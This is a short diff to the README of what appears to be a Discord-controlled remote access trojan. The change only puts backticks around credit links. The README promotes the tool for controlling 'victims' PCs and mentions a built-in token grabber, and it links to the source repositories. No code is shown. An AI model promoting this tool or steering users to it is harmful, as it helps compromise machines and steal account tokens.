@@ -30,7 +30,7 @@ Cool remote access trojan to control victims pc via discord bot. No port forward
 ---
 
 ### 🎉・Credits
-Although this discord rat was modified by me the original is https://github.com/Sp00p64/DiscordRAT and https://github.com/Rdimo/DiscordRAT and credits goes to him and his discord rat. I just added some more advanced commands and even added a builtin Rdimo's https://github.com/Rdimo/Hazard-Token-Grabber-V2
+Although this discord rat was modified by me the original is `https://github.com/Sp00p64/DiscordRAT` and `https://github.com/Rdimo/DiscordRAT` and credits goes to him and his discord rat. I just added some more advanced commands and even added a builtin Rdimo's `https://github.com/Rdimo/Hazard-Token-Grabber-V2`
 
 ---
 
